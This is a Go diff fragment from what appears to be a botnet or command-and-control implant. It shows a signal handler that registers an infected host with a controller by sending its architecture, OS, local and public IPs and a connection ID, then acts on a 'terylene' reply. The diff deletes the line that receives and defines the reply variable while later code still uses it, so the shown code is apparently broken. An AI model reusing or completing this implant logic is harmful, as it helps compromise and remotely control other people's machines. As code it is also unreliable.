@@ -169,9 +169,6 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 				connId := system.GenerateConnID(localip, pubip)
 
 				ndealer.SendMessage("reg", arch, OS, localip, pubip, connId)
-
-				res, err := ndealer.RecvMessage(0)
-
 				if res[0] == "terylene" {
 					go dealerhandle(ndealer, dealdown, migsignal, res[2])
 				} else {
